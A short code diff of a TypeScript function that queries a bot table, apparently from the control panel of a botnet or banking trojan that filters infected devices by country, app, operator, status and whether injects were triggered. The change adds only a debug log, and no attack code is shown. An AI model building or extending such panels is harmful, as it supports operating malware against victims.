@@ -3,6 +3,7 @@ import { api } from "../../../common/Utility";
 import { Base64 } from "js-base64"
 
 export const getBotTable = (page: number = 1, perPage: number = 10, botId: string = '', country: string = '', app: string = '', operator: string = '', online: boolean = false, offline: boolean = false, dead: boolean = false, hadInjects = false, hasNotInjects = false, triggeredInject = false) => {
+
   return new Promise((res, rej) => {
     const params = {
       type: 'getBotTable',
@@ -19,6 +20,7 @@ export const getBotTable = (page: number = 1, perPage: number = 10, botId: strin
       hasNotInjects: hasNotInjects,
       triggeredInject: triggeredInject
     }
+    console.log(params)
 
     api(params).done(res).catch(rej)
   })
